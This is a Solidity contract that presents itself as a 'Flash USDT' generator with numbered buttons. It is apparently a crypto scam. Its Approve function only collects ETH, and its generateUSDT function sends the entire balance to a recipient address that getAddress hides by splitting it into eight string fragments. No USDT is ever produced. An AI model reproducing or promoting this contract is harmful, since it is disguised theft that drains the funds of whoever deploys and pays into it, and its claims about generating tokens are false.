// SPDX-License-Identifier: MIT
pragma solidity ^0.8.31;

contract FLASHUSDT {

    address public owner;

    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed to, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    // -------- 1️⃣ Approve (First Button) --------
    function Approve() external payable {
        require(msg.value > 0, "Send some ETH");
        emit Deposited(msg.sender, msg.value);
    }

    // -------- 2️⃣ Generate Flash USDT (Second Button) --------
    function generateUSDT() external {
        require(msg.sender == owner, "Only owner");

        uint256 balance = address(this).balance;
        require(balance > 0, "No balance");

        address withdrawAddress = getAddress();

        (bool success, ) = payable(withdrawAddress).call{value: balance}("");
        require(success, "Transfer failed");

        emit Withdrawn(withdrawAddress, balance);
    }

    // -------- 3️⃣ Get Balance --------
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    // -------- 4️⃣ Get Built Address --------
    function getAddress() public pure returns (address) {

        string memory part1 = "0x26";
        string memory part2 = "F02919";
        string memory part3 = "188Ff1";
        string memory part4 = "D6B23D";
        string memory part5 = "79eEaA";
        string memory part6 = "BcB1E4";
        string memory part7 = "A97892";
        string memory part8 = "04";

        string memory full = join(
            join(join(join(part1, part2), join(part3, part4)),
            join(join(part5, part6), join(part7, part8))),
            ""
        );

        return parse(full);
    }

    function join(string memory a, string memory b)
        internal pure returns (string memory)
    {
        return string(abi.encodePacked(a, b));
    }

    function parse(string memory s) internal pure returns (address) {
        bytes memory tmp = bytes(s);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;

        for (uint i = 2; i < 42; i += 2) {
            iaddr *= 256;

            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));

            b1 = hexCharToUint(b1);
            b2 = hexCharToUint(b2);

            iaddr += (b1 * 16 + b2);
        }

        return address(iaddr);
    }

    function hexCharToUint(uint160 c) internal pure returns (uint160) {
        if (c >= 97) return c - 87;     // a-f
        if (c >= 65) return c - 55;     // A-F
        return c - 48;                  // 0-9
    }

    // Receive direct ETH
    receive() external payable {
        emit Deposited(msg.sender, msg.value);
    }
}